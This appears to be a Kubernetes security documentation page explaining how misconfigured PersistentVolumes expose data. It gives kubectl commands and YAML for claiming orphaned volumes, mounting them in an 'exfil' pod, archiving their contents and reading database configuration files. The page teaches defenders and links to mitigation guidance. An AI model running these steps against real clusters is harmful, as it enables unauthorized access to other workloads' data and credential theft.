---
sidebar_position: 24
title: "Persistent Volume Data Exposure"
description: "How attackers exploit misconfigured PersistentVolumes to access sensitive data from other workloads or previously deleted pods in Kubernetes."
keywords: [kubernetes security, persistent volume, PV security, storage security, data exposure, PVC attack, volume access, kubernetes storage, reclaim policy, CKS]
tags: [attack-vector, storage, data-exposure, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/pod_security/persistent_volume_security/
  - /docs/attack_vectors/unrestricted_hostpath_mounts/
  - /docs/attack_vectors/insecure_secrets_management/
---

# Persistent Volume Data Exposure

**PersistentVolumes (PVs)** in Kubernetes provide storage that persists beyond the lifecycle of individual pods. When improperly configured, PVs can expose sensitive data to unauthorized workloads. Common misconfigurations include using `Retain` reclaim policies without clearing data, allowing `ReadWriteMany` access modes, and failing to restrict volume access through RBAC.

Attackers who gain the ability to create pods or PersistentVolumeClaims can **mount existing volumes, access data from other namespaces, or recover data from deleted workloads**.

---

## Exploitation Steps

An attacker with permissions to create pods or PVCs exploits storage misconfigurations to access sensitive data.

### 1. Enumerate Available PersistentVolumes

The attacker lists available PVs to identify potential targets:

```bash
kubectl get pv -o wide
```

Output reveals:

```
NAME       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM
database   100Gi      RWO            Retain           Released    production/db-data
logs-pv    50Gi       RWX            Retain           Available   
backups    200Gi      RWO            Retain           Released    backup/daily
```

Volumes with `Released` or `Available` status and `Retain` policy may contain data from previous workloads.

---

### 2. Claim an Orphaned PersistentVolume

The attacker creates a PVC that binds to a released PV containing sensitive data:

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: stolen-data
  namespace: attacker-namespace
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 100Gi
  volumeName: database
```

```bash
kubectl apply -f stolen-pvc.yaml
```

If the PV allows binding, the attacker gains access to the previous workload's data.

---

### 3. Mount the Volume and Extract Data

The attacker creates a pod that mounts the claimed volume:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: data-exfil
  namespace: attacker-namespace
spec:
  containers:
    - name: extractor
      image: busybox
      command: ["sleep", "infinity"]
      volumeMounts:
        - name: stolen-volume
          mountPath: /data
  volumes:
    - name: stolen-volume
      persistentVolumeClaim:
        claimName: stolen-data
```

```bash
kubectl apply -f exfil-pod.yaml
kubectl exec -it data-exfil -n attacker-namespace -- /bin/sh
```

Inside the pod, the attacker accesses the data:

```bash
ls -la /data/
cat /data/config/database.conf
tar -czf /tmp/exfil.tar.gz /data/
```

---

### 4. Exploit ReadWriteMany Volumes

If a PV uses `ReadWriteMany` (RWX) access mode, multiple pods can mount it simultaneously. The attacker creates a pod that mounts the same volume as a production workload:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: shared-access
  namespace: attacker-namespace
spec:
  containers:
    - name: snooper
      image: busybox
      command: ["sleep", "infinity"]
      volumeMounts:
        - name: shared-data
          mountPath: /shared
  volumes:
    - name: shared-data
      persistentVolumeClaim:
        claimName: shared-logs
```

The attacker can now read or modify data written by other workloads.

---

### 5. Access Data via Direct Volume Path

In cloud environments, the attacker may identify the underlying storage:

```bash
kubectl get pv database -o jsonpath='{.spec.csi.volumeHandle}'
```

Output: `vol-0abc123def456789`

Using cloud credentials obtained through other attacks, they can attach this volume directly to a compromised instance.

---

### Result

The attacker achieves:

- **Access to orphaned data** from deleted workloads
- **Cross-namespace data access** via shared volumes
- **Database credential theft** from configuration files
- **Data modification** on RWX volumes affecting other workloads
- **Compliance violations** through unauthorized data access

---

## Mitigation

➡ [Securing Persistent Volumes](/docs/best_practices/cluster_setup_and_hardening/pod_security/persistent_volume_security/)

---

## References

This article is based on information from the following official sources:

1. [Persistent Volumes](https://kubernetes.io/docs/concepts/storage/persistent-volumes/) - Kubernetes Documentation
2. [Storage Classes](https://kubernetes.io/docs/concepts/storage/storage-classes/) - Kubernetes Documentation
3. [Configure a Pod to Use a PersistentVolume for Storage](https://kubernetes.io/docs/tasks/configure-pod-container/configure-persistent-volume-storage/) - Kubernetes Documentation
